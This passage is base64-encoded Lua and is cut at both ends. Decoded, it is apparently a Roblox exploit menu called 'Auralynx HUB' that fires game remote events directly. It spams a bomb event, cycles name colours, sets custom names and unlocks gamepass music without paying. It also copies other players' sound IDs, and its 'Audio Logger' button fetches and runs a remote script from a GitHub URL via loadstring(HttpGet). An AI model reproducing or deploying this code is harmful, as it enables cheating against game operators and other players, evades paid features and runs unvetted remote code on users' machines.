CAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBCb21iQWN0aXZlIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgQm9tYiBhbmQgUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBWaXJ0dWFsSW5wdXRNYW5hZ2VyID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsSW5wdXRNYW5hZ2VyIikKICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kTW91c2VCdXR0b25FdmVudCg1MDAsIDUwMCwgMCwgdHJ1ZSwgZ2FtZSwgMCkgCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAwMDUpCiAgICAgICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlQnV0dG9uRXZlbnQoNTAwLCA1MDAsIDAsIGZhbHNlLCBnYW1lLCAwKSAKCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIEV4ZWN1dGVzIHRoZSBGaXJlU2VydmVyIHdpdGggdGhlIHBsYXllcidzIG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJCb21iIiAuLiBQbGF5ZXIuTmFtZSAtLSBVc2VzIHRoZSBjdXJyZW50IHBsYXllcidzIG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQmxvMXdCb21iMXNTZXJ2ZTFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDA1KSAtLSAxLXNlY29uZCBpbnRlcnZhbCBmb3IgY2xpY2sgYW5kIEZpcmVTZXJ2ZXIKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZWxzZQogICAgICAgICAgICAtLSBEZWFjdGl2YXRpbmcgdGhlIGZ1bmN0aW9uYWxpdHkKICAgICAgICAgICAgQm9tYkFjdGl2ZSA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCgpsb2NhbCBUYWIgPSBXaW5kb3c6TWFrZVRhYih7Iu+4sU5hbWVzIiwgInJieGFzc2V0aWQ6Ly84MjU1OTA5OTA3Mzc5NCJ9KQoKbG9jYWwgU2VjdGlvblJHQk5hbWUgPSBUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIvCfk4TvuLFSYWluYm93IE5hbWVzIgp9KQoKVGFiOkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gIlJhaW5ib3cgTmFtZSIsCiAgICBEZXNjcmlwdGlvbiA9ICLwn5OE77ixVHVybnMgeW91ciBuYW1lIHdpdGggbXVsdGlwbGUgY29sb3JzLiIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIGlzTmFtZUFjdGl2ZSA9IHZhbHVlCiAgICBlbmQKfSkKCgpsb2NhbCBTZWN0aW9uUkdCQmlvID0gVGFiOkFkZFNlY3Rpb24oewogICAgTmFtZSA9ICLwn5OE77ixQmlvIgp9KQoKVGFiOkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gIlJhaW5ib3cgQmlvIiwKICAgIERlc2NyaXB0aW9uID0gIvCfk4TvuLFUdXJucyB5b3VyIGJpbyB3aXRoIG11bHRpcGxlIGNvbG9ycy4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBpc0Jpb0FjdGl2ZSA9IHZhbHVlCiAgICBlbmQKfSkKCgpsb2NhbCB2aWJyYW50Q29sb3JzID0gewogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSwKICAgIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCksCiAgICBDb2xvcjMuZnJvbVJHQigwLCAwLCAyNTUpLAogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDApLAogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAyNTUpLAogICAgQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAyNTUpLAogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAxNjUsIDApLAogICAgQ29sb3IzLmZyb21SR0IoMTI4LCAwLCAxMjgpLAogICAgQ29sb3IzLmZyb21SR0IoMjU1LCAyMCwgMTQ3KQp9CgpzcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgaWYgaXNOYW1lQWN0aXZlIHRoZW4KICAgICAgICAgICAgbG9jYWwgcmFuZG9tQ29sb3IgPSB2aWJyYW50Q29sb3JzW21hdGgucmFuZG9tKCN2aWJyYW50Q29sb3JzKV0KICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nUlBOYW1lQ29sb3IiLAogICAgICAgICAgICAgICAgWzJdID0gcmFuZG9tQ29sb3IKICAgICAgICAgICAgfQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFSUE5hbTFlQ29sbzFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgwLjEpCiAgICBlbmQKZW5kKQoKc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGlmIGlzQmlvQWN0aXZlIHRoZW4KICAgICAgICAgICAgbG9jYWwgcmFuZG9tQ29sb3IgPSB2aWJyYW50Q29sb3JzW21hdGgucmFuZG9tKCN2aWJyYW50Q29sb3JzKV0KICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nUlBCaW9Db2xvciIsCiAgICAgICAgICAgICAgICBbMl0gPSByYW5kb21Db2xvcgogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVJQTmFtMWVDb2xvMXIiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBlbmQKICAgICAgICB3YWl0KDAuMSkKICAgIGVuZAplbmQpCgotLSBWZWxvY2lkYWRlIGNvbnRyb2xhZGEgcGVsbyBzbGlkZXIgKHF1YW50byBtYWlvciwgbWFpcyByw6FwaWRvKQpsb2NhbCByZ2JTcGVlZCA9IDEKClRhYjpBZGRTbGlkZXIoewogICAgTmFtZSA9ICJSYWluYm93IHNwZWVkIiwKICAgIERlc2NyaXB0aW9uID0gIvCfk4TvuLFTbGlkZSB0byBjaGFuZ2UgdGhlIHNwZWVkIG9mIHRoZSByYWluYm93LiIsCiAgICBNaW4gPSAxLAogICAgTWF4ID0gMTMsCiAgICBJbmNyZWFzZSA9IDEsCiAgICBEZWZhdWx0ID0gMywKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgcmdiU3BlZWQgPSBWYWx1ZQogICAgZW5kCn0pCgotLSBGdW7Dp8OjbyBwYXJhIGNyaWFyIGNvciBSR0Igc3VhdmUgY29tIEhTVgpsb2NhbCBmdW5jdGlvbiBnZXRSYWluYm93Q29sb3Ioc3BlZWRNdWx0aXBsaWVyKQogICAgbG9jYWwgaCA9ICh0aWNrKCkgKiBzcGVlZE11bHRpcGxpZXIgJSA1KSAvIDUgLS0gZ2lyYSBvIGh1ZSBzdWF2ZW1lbnRlIGRlIDAgYSAxCiAgICByZXR1cm4gQ29sb3IzLmZyb21IU1YoaCwgMSwgMSkKZW5kCgotLSBGdW7Dp8OjbyBwYXJhIGRpc3BhcmFyIGV2ZW50b3MKbG9jYWwgZnVuY3Rpb24gZmlyZVNlcnZlcihldmVudE5hbWUsIGFyZ3MpCiAgICBsb2NhbCBldmVudCA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpGaW5kRmlyc3RDaGlsZCgiUkUiKQogICAgaWYgZXZlbnQgYW5kIGV2ZW50OkZpbmRGaXJzdENoaWxkKGV2ZW50TmFtZSkgdGhlbgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZXZlbnRbZXZlbnROYW1lXTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCgoKbG9jYWwgU2VjdGlvbk5hbWVzID0gVGFiOkFkZFNlY3Rpb24oewogICAgTmFtZSA9ICLwn5Gk77ixQWRkIGN1c3RvbSBuYW1lcyB0byBwbGF5ZXIiCn0pCgpsb2NhbCBuYW1lcyA9IHsKICAgIHsiTElDRU5TRSIsICIg8J+Rke+4sUxpY2Vuc2UgIn0sCiAgICB7IkxZTlhTVVBQT1JURVIiLCAiIPCfkZHvuLFMeW54IFN1cHBvcnRlciAifSwKICAgIHsiQzAwTEtJREQiLCAiIEMwMGxraWRkICJ9LAogICAgeyJEQVJLTkVTUyIsICIgRGFya25lc3MgIn0sCiAgICB7IkdIT1NUIiwgIiBHaG9zdCAifSwKICAgIHsiSk9LRVIiLCAiIEpva2VyICJ9LAogICAgeyJBRE1JTkVSIiwgIiBBZG1pbmVyICJ9LAogICAgeyJUVUJFUlM5MyIsICIgVHViZXJzOTMgIn0sCiAgICB7Ik5BTiIsICIgTmFuICJ9LAogICAgeyJTSEFET1ciLCAiIFNoYWRvdyAifSwKICAgIHsiSU5DME1VTSIsICIgSU5DME1VTSJ9LAogICAgeyJTSUdNQSIsICIgU2lnbWEg8J+SgCJ9Cn0KCmZvciBfLCBuYW1lIGluIGlwYWlycyhuYW1lcykgZG8KICAgIFRhYjpBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSAiTmFtZTogIiAuLiBuYW1lWzFdLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkVbIjFSUE5hbTFlVGV4MXQiXTpGaXJlU2VydmVyKCJSb2xlUGxheU5hbWUiLCBuYW1lWzJdKQogICAgICAgIGVuZAogICAgfSkKZW5kCgpsb2NhbCBNdXNpY1RhYiA9IFdpbmRvdzpNYWtlVGFiKHsi77ixTXVzaWMgKEdhbWVwYXNzKSIsICJyYnhhc3NldGlkOi8vMTEzNTM3NjExNTY3NzA3In0pCgpsb2NhbCBTZWN0aW9uID0gTXVzaWNUYWI6QWRkU2VjdGlvbih7IvCfjrXvuLFNdXNpYyJ9KQoKbG9jYWwgbXVzaWNEYXRhID0gewogICAgIkZ1bmsgZGEgRmVicmUiLCAiU3dpdGNoIFRoZSBDb2xvcnMgKEplcnNleSBDbHViKSIsICJUcmFzaCBGdW5rIiwgIjI2MDkgKEplcnNleSBDbHViKSIsCiAgICAiU3Bvb2t5IFNjYXJ5IFN1bmRheSAoSmVyc2V5IENsdWIpIiwgIkFOT1RFIEHDjSIsICJUZW1wdGF0aW9uIiwgIkVsYSBUYW5vIiwgIlNldSBmw6MiLAogICAgIkJhaWzDo28iLCAiRW0gRGV6ZW1icm8gZGUgODEgLSBGbGFtZW5nbyIsICJFc3F1ZW1hIENvbmZpcm1hZG8gLSBBcnJvY2hhIiwgIkpFUlNFWSBXQVZFIiwKICAgICJBcnJlcGlhIFhMIDIiLCAiTWVlcGNpdHkgKEplcnNleSBDbHViKSIsICJNYW5kYSBNZXUgUGFzc2luaG8iLCAiTGVtYnJvIGF0w6kgaG9qZSIsICJIUiAtIEVFWVVIISIsCiAgICAiSSBsb3ZlIGhhIiwgIlNIRSBET04nVCAtIExvbmVseWJ3b2kiLCAiTlkgRHJpbGwgUml0dWFsIiwgIkl0IERvZXNuJ3QgTWF0dGVyIChKZXJzZXkgQ2x1YikiLAogICAgIlBDQyIsICJFbGEgc2UgZW52b2x2ZXUiLCAiTW9udGFnZW0gUG9zZSIsICJUcmVtIEZhbnRhc21hIEZ1bmsiLCAiRml6IGRlIFR1ZG8iLCAiRVUgTsODTyBFU1RPVSBMT1VDTyIsCiAgICAiRlVOSyBEQSBQUkFJQSAoU0xPV0VEKSIsICJIb2dvIEZ1bmsiLCAiTm92aW5oYSBzYXBlY2EiLCAiQU5BTE9HIEhPUlJPUiBGVU5LIiwgIkR1bSBEdW0iLAogICAgIlJlYm9sYSBwcm8gcGFpIiwgIkNhcnJvIEJpeG8iLCAiT25pY2hhbiIsICJBcnJlcGlhIFhMIDYiLCAiTWFuZHJha2UiLCAiVG9tYSBUb21hIiwgIkzDoSBubyBtZXUgYmFycmFjbyIsCiAgICAiQmF0aWRhIFNQIiwgIkZ1bmsgU1AiLCAiUGVnYSBubyBjaXDDsyIsICJSYXAgZG8gTWluZWNyYWZ0IChGdW5rKSIsICJNZWxvZGlhIGRvIFZlcsOjbyIsICJGdW5rIGRvIEZhbWdsaWEiLAogICAgIlZlbSBubyBwaXF1ZSAoUGhvbmspIiwgIk1pY2hhZWwgSmFja3NvbiBGVU5LIiwgIkFycmVwaWEgWEwgNCIsICJNT05UQUdFTSBOT1ZBIE3DgUdJQ0EgMS4wIiwKICAgICJWMiBEYXF1ZWxhIChYTCBGdW5rKSIsICJEaWdpdGVpIHNldSBuw7ptZXJvIChTZXJ0YW5lam8pIiwgIkF1dG8gdG9tYSIsICJNb250YWdlbSBCYWxhbsOnbyIsCiAgICAiUGlzZWlybyBjb20gc2VydGFuZWpvIiwgIk1vbnRhZ2VtIFZvemVzIFRhbGVudGluaG8iLCAiU3Bvb2t5IFNjYXJ5IChGdW5rKSIsICJTRU5UQSAoTkdMIHggWEwpIiwKICAgICJIYWhhIChOR0wpIiwgIkFCNFQiLCAiUGFzc28gYmVtIHNvbHRvIiwgIklMV1UiLCAiVGhlIE9uZSIsICJDbGluZ3kiLCAiUmVteWJveXogMiIsICJCdXJuaW5nIEJsdWUiLAogICAgIkNsb3VkIDkiLCAiUklHSFQgTk9XIiwgIkNhdGNoIiwgIlRhaWwgSmVyc2V5IiwgIlNoZSBLZWVwcyBvbiBUZXh0aW4gbWUiLCAiU3RheSB3aXRoIG1lIiwgIk5vdGlvbiIsCiAgICAiQmFkIEhhYml0IiwgIlRyaXBsZSBSZWQiLCAiQ2hvcHBhIFNob3R0YSBGbG93Igp9Cgpsb2NhbCBtdXNpY0lkcyA9IHsKICAgICI5NDcxODQ3MzgzMDY0MCIsICI5MjIwOTQyODkyNjA1NSIsICIxMzM5MDA1NjE5NTcxMDMiLCAiOTM3Njg2MzYxODQ2OTciLCAiOTIwNjI1ODgzMjkzNTIiLAogICAgIjg0NzczNzM3ODIwNTI2IiwgIjg3NzgzODU3MjIxMjg5IiwgIjg4MzQyMjk2MjcwMDgyIiwgIjg1MzQyMDg2MDgyMTExIiwgIjEwNzQzNDE2MDIyNTYyMCIsCiAgICAiOTI0OTIwMzk1MzQzOTkiLCAiMTM0MDM1Nzg4ODgxNzk2IiwgIjE4ODQxODkzNTY3IiwgIjczOTYyNzIzMjM0MTYxIiwgIjE0MDI2ODU4MzQxMzIwOSIsCiAgICAiNzc3NDEyOTQ3MDk2NjAiLCAiNzE1MzE1MzM1NTI4OTkiLCAiMTYxOTA3ODIxODEiLCAiMTE3MTY5MjA5Mjc3OTcyIiwgIjgxMjk5MzMyMTMxODY4IiwKICAgICI3NzE0NzkxMTM0OTA1OSIsICIxMjQwOTI4MzA4Mzk5MjgiLCAiODQ5MjgwMzE0ODg0OTgiLCAiODgwOTQ0NzkzOTk0ODkiLCAiODgzMzk0ODYwMTk0ODYiLAogICAgIjk3NzY1NzE0MTExNDkzIiwgIjEzMDQwMTM0ODY5NzcyMSIsICI3NDM2Njc2NTk2NzQ3NSIsICIxMTIwNjg4OTI3MjE0MDgiLCAiMTEyMTQzOTQ0OTgyODA3IiwKICAgICIxMTE2NjgwOTcwNTI5NjYiLCAiMTEyMjE0ODE0NTQ0NjI5IiwgIjEwMTUwMDkxNTQzNDMyOSIsICI5NTA0NjA5MTMxMjU3MCIsICIxMTAwOTEwOTgyODMzNTQiLAogICAgIjE3NDIyMTU2NjI3IiwgIjgyNDExNjQyOTYxNDU3IiwgIjg3MDIyNTgzOTQ3NjgzIiwgIjk2OTc0MzU0OTk1NzE1IiwgIjExOTAyMDIzNTc5MjQzMCIsCiAgICAiODI0MTE2NDI5NjE0NTciLCAiOTYyMTU2MjAyMDI0NzAiLCAiNzA3ODIxNzYwMTI2MTkiLCAiMTEyODkzMzU0Mjc2MzM4IiwgIjExODUwNzM3MzM5OTY5NCIsCiAgICAiOTg2OTE4NzkyMzI3MTgiLCAiMTM0NDU3Mjk2NzQ5NTE4IiwgIjExODYwNzMwMzIwNTAwNSIsICIxMjc1MDQ3NjIwNTE3NjUiLCAiMTE4Mjk3NDg3NTI5MjM5IiwKICAgICIxMzIwODIzOTcyNDc4MjQiLCAiMTA2OTU4NjMwNDE5NjI5IiwgIjg2Njg1NjM1Nzg2OTQzIiwgIjEwMTQ1NjgxMzQyOTU4NCIsICIxMDA1MzMyMTMzMDU3OTMiLAogICAgIjExMjkzMDM2Nzc1ODIyMiIsICIxMDA4MjgwNTA1OTQxMzciLCAiMTI0MDg1NDIyMjc2NzMyIiwgIjEyMjExNDc2NjU4NDkxOCIsICIxNzQyMjE3MzQ2NyIsCiAgICAiMTE5OTM2MTM5OTI1NDg2IiwgIjkwODMxMDE1OTc1ODYxIiwgIjEzOTI0MDIwMTYxODMwMiIsICI5NDUyNDUwODQ0ODk5NCIsICIxMzcwMDc3MjIwNTQ1ODYiLAogICAgIjE0MDIzMjEwMjU1Nzg4MiIsICI3OTcwNzI5NjA3NzIyNiIsICIxMjI4Nzc5ODc1MjU4OTAiLCAiMTEwODQ2MTY1Njk3Mjc0IiwgIjgyMTUwNjU5Mzg5OTAwIiwKICAgICI5ODQ5ODg1ODU3NjQwMSIsICIxMjYzOTcxNjczOTY3NTEiLCAiNzYzNDg2Mzk0MzQ3NzIiLCAiOTQ2MTI0NjA3ODQ0OTAiLCAiODk1NzU0NzU0NTU5MjAiLAogICAgIjEwNDUzNzA0ODI3NzY2NiIKfQoKbG9jYWwgcmVwID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCgpsb2NhbCBmdW5jdGlvbiBwbGF5TXVzaWNSZW1vdGUodGlwbywgaWQpCiAgICBpZiBpZCBhbmQgaWQgfj0gIiIgdGhlbgogICAgICAgIGlmIHRpcG8gPT0gIlZlaGljbGUiIHRoZW4KICAgICAgICAgICAgcmVwOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFQbGF5ZXIxc0NhMXIiKTpGaXJlU2VydmVyKCJQaWNraW5nVmVoaWNsZU11c2ljVGV4dCIsIGlkKQogICAgICAgIGVsc2VpZiB0aXBvID09ICJTY29vdGVyIiB0aGVuCiAgICAgICAgICAgIHJlcDpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxTm9Nb3RvMXJWZWhpY2xlMXMiKTpGaXJlU2VydmVyKCJQaWNraW5nU2Nvb3Rlck11c2ljVGV4dCIsIGlkKQogICAgICAgIGVsc2VpZiB0aXBvID09ICJNb3RvcmN5Y2xlIiB0aGVuCiAgICAgICAgICAgIHJlcDpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxUGxheWVyMXNDYTFyIik6RmlyZVNlcnZlcigiUGlja2luZ0Nhck11c2ljVGV4dCIsIGlkKQogICAgICAgIGVsc2VpZiB0aXBvID09ICJSYWRpbyIgdGhlbgogICAgICAgICAgICByZXA6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiUGxheWVyVG9vbEV2ZW50Iik6RmlyZVNlcnZlcigiVG9vbE11c2ljVGV4dCIsIGlkKQogICAgICAgIGVsc2VpZiB0aXBvID09ICJIb3VzZSIgdGhlbgogICAgICAgICAgICByZXA6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMVBsYXllcjFzSG91czFlIik6RmlyZVNlcnZlcigiUGlja0hvdXNlTXVzaWNUZXh0IiwgaWQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpNdXNpY1RhYjpBZGRQYXJhZ3JhcGgoeyLwn5OE77ixTm90ZToiLCAiVGhlIG11c2ljIHNjcmlwdCB3b3JrcyBmb3IgdmVoaWNsZXMsIHNjb290ZXJzLCBjYXJzLCB0b29scyBhbmQgaG91c2VzLiJ9KQoKTXVzaWNUYWI6QWRkRHJvcGRvd24oewogICAgTmFtZSA9ICJTZWxlY3QgVHlwZSIsCiAgICBPcHRpb25zID0geyJWZWhpY2xlIiwgIlNjb290ZXIiLCAiTW90b3JjeWNsZSIsICJSYWRpbyIsICJIb3VzZSJ9LAogICAgRGVmYXVsdCA9ICJWZWhpY2xlIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgX0cuU2VsZWN0ZWRNdXNpY1R5cGUgPSB2YWx1ZQogICAgZW5kCn0pCgpfRy5TZWxlY3RlZE11c2ljVHlwZSA9ICJWZWhpY2xlIgoKTXVzaWNUYWI6QWRkVGV4dEJveCh7CiAgICBOYW1lID0gIk11c2ljIElEIChHYW1lcGFzcykiLAogICAgUGxhY2Vob2xkZXJUZXh0ID0gIkluc2VydCBJRCBoZXJlLi4uIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgcGxheU11c2ljUmVtb3RlKF9HLlNlbGVjdGVkTXVzaWNUeXBlLCB2YWx1ZSkKICAgIGVuZAp9KQoKTXVzaWNUYWI6QWRkRHJvcGRvd24oewogICAgTmFtZSA9ICJTZWxlY3QgTXVzaWMgKEdhbWVwYXNzKSIsCiAgICBPcHRpb25zID0gbXVzaWNEYXRhLCAtLSBhcGVuYXMgbm9tZXMgYXBhcmVjZW0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24obmFtZSkKICAgICAgICBsb2NhbCBpbmRleCA9IHRhYmxlLmZpbmQobXVzaWNEYXRhLCBuYW1lKQogICAgICAgIGlmIGluZGV4IHRoZW4KICAgICAgICAgICAgcGxheU11c2ljUmVtb3RlKF9HLlNlbGVjdGVkTXVzaWNUeXBlLCBtdXNpY0lkc1tpbmRleF0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCk11c2ljVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkF1ZGlvIExvZ2dlciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x5bnh4ZGV2L2ZyZWVtYW4tc2NyaXB0c3MvbWFpbi9hdWRpb2xvZ2dlci5sdWEiKSkoKQogICAgZW5kCn0pCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFN0YXJ0ZXJHdWkgPSBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKQoKbG9jYWwgZnVuY3Rpb24gU2VuZE5vdGlmKHRleHQpCiAgICBTdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiQXVyYWx5bnggSFVCIiwKICAgICAgICBUZXh0ID0gdGV4dCwKICAgICAgICBEdXJhdGlvbiA9IDYKICAgIH0pCmVuZAoKbG9jYWwgZnVuY3Rpb24gZ2V0UGxyKG5hbWUpCiAgICBpZiBub3QgbmFtZSBvciB0eXBlKG5hbWUpIH49ICJzdHJpbmciIHRoZW4KICAgICAgICByZXR1cm4ge30KICAgIGVuZAogICAgbG9jYWwgdCA9IHt9CiAgICBsb2NhbCBsbmFtZSA9IG5hbWU6bG93ZXIoKQogICAgZm9yIF8sIHBsciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBwbHIuTmFtZTpsb3dlcigpOm1hdGNoKGxuYW1lKSB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydCh0LCBwbHIpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiB0CmVuZAoKbG9jYWwgZnVuY3Rpb24gQ29uY2F0KHQsIHNlcCkKICAgIHJldHVybiB0YWJsZS5jb25jYXQodCwgc2VwIG9yICIsIikKZW5kCgpsb2NhbCBmdW5jdGlvbiBnZXRNdXNpY1BsYXllckxpc3QoKQogICAgbG9jYWwgcGxheWVyTmFtZXMgPSB7fQogICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHBsYXllck5hbWVzLCBwbGF5ZXIuTmFtZSkKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIHBsYXllck5hbWVzCmVuZAoKTXVzaWNUYWI6QWRkRHJvcGRvd24oewogICAgTmFtZSA9ICJTdGVhbCBQbGF5ZXIncyBNdXNpYyBJRDoiLAogICAgT3B0aW9ucyA9IGdldE11c2ljUGxheWVyTGlzdCgpLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZFBsYXllck5hbWUpCiAgICAgICAgaWYgbm90IHNlbGVjdGVkUGxheWVyTmFtZSB0aGVuCiAgICAgICAgICAgIFNlbmROb3RpZigiUGxheWVyIG5vdCBmb3VuZCIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBwbGF5ZXJzID0gZ2V0UGxyKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgICAgICBpZiBub3QgbmV4dChwbGF5ZXJzKSB0aGVuCiAgICAgICAgICAgIFNlbmROb3RpZigiUGxheWVyIG5vdCBmb3VuZCIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBpZHMgPSB7fQogICAgICAgIGZvciBfLCBwbHIgaW4gcGFpcnMocGxheWVycykgZG8KICAgICAgICAgICAgbG9jYWwgY2hhciA9IHBsci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgY2hhciB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgc25kIGluIHBhaXJzKGNoYXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBzbmQ6SXNBKCJTb3VuZCIpIGFuZCBzbmQuUGxheWluZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChpZHMsIHNuZC5Tb3VuZElkKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBpZiAjaWRzID4gMCB0aGVuCiAgICAgICAgICAgIHNldGNsaXBib2FyZChDb25jYXQoaWRzLCAiXG4iKSkKICAgICAgICAgICAgU2VuZE5vdGlmKCLwn5OE77ixQXVkaW8gbGlua3MgY29waWVkLiIpCiAgICAgICAgZWxzZQogICAgICAgICAgICBTZW5kTm90aWYoIuKdjO+4sU5vIGF1ZGlvIGZvdW5kLiIpCiAgICAgICAgZW5kCiAgICBlbmQsCiAgICBSZWZyZXNoT3B0aW9ucyA9IGdldE11c2ljUGxheWVyTGlzdAp9KQpsb2NhbCBDYXJUYWIgPSBXaW5kb3c6TWFrZVRhYih7Iu+4sUNhcnMgIiwgInJieGFzc2V0aWQ6Ly83MDg0OTI1MDgxOTE5NSJ9KQoKbG9jYWwgU2VjdGlvbiA9IENhclRhYjpBZGRTZWN0aW9uKHsi8J+amO+4sUNhciBmdW5jdGlvbnMifSkKCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgV29ya3NwYWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgQ2FtZXJhID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKCi0tIE5hbWVzcGFjZSBwYXJhIGV2aXRhciBjb25mbGl0b3MKbG9jYWwgVGVsZXBvcnRDYXJybyA9IHt9ClRlbGVwb3J0Q2Fycm8uUGxheWVycyA9IFBsYXllcnMKVGVsZXBvcnRDYXJyby5Xb3Jrc3BhY2UgPSBXb3Jrc3BhY2UKVGVsZXBvcnRDYXJyby5Mb2NhbFBsYXllciA9IExvY2FsUGxheWVyClRlbGVwb3J0Q2Fycm8uQ2FtZXJhID0gQ2FtZXJhCgotLSBGdW7Dp8OjbyBwYXJhIGV4aW